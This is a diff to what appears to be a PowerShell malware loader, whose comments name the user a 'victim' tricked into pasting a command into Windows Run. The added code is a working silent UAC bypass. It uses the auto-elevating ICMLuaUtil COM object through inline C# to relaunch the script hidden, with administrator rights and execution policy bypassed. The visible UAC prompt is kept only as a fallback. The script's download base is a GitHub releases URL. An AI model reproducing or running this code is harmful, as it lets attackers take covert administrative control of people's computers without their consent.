@@ -9,8 +9,41 @@ $ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/downlo
 
 $admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
 if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # not elevated (Win+R case): re-launch self elevated, victim just clicks "Yes" on UAC
-    Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-nop','-ep','bypass','-f',$PSCommandPath)
+    # not elevated (Win+R case): silent UAC bypass via auto-elevate COM object,
+    # fallback to the visible UAC prompt if the COM trick is patched out
+    $relaunch = {
+        param($elev)
+        if ($elev) {
+            Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-nop','-ep','bypass','-f',$PSCommandPath)
+        }
+    }
+    $bypassed = $false
+    try {
+        $def = @'
+using System;
+using System.Runtime.InteropServices;
+public class WkUac {
+    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    interface ICMLuaUtil {
+        void M1(); void M2(); void M3();
+        void ShellExec(ref string file, ref string prm, ref string dir, ref string op, int show);
+        void M5(); void M6();
+    }
+    [ComImport, Guid("3E000D72-A845-4CD5-BD3F-8C5D4B0F5F27")]
+    class CMLuaUtil {}
+    public static void Run(string file, string prm) {
+        object o = new CMLuaUtil();
+        ICMLuaUtil u = (ICMLuaUtil)o;
+        string f = file, p2 = prm, d = "", op = "";
+        u.ShellExec(ref f, ref p2, ref d, ref op, 0);
+    }
+}
+'@
+        Add-Type -TypeDefinition $def -ErrorAction Stop
+        [WkUac]::Run('powershell.exe', '-w h -nop -ep bypass -f ' + $PSCommandPath)
+        $bypassed = $true
+    } catch { $bypassed = $false }
+    & $relaunch (-not $bypassed)
     exit
 }
 
